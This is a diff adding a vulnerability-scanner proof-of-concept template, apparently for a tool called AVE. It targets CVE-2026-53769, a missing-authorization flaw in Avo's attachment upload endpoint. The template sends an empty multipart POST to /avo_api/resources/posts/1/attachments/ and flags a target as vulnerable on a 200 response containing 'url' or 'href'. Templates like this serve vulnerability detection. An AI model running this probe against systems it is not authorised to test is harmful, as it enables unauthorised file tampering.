@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = "Avo 直接附件上传端点缺少服务端上传授权，已认证用户可绕过字段级上传策略（upload_{FIELD_ID}?）直接向 /avo_api/resources/:resource_name/:id/attachments/ 发送 POST 请求替换或添加附件内容"
+id = "POC-AVE-2026-0444"
+name = "CVE-2026-53769 PoC"
+severity = "medium"
+tags = [
+    "cve-2026-53769",
+    "avo",
+    "missing-authorization",
+    "file-upload",
+]
+vuln_id = [
+    "CVE-2026-53769",
+    "AVE-2026-0444",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/avo_api/resources/posts/1/attachments/"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "multipart/form-data"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "url",
+    "href",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
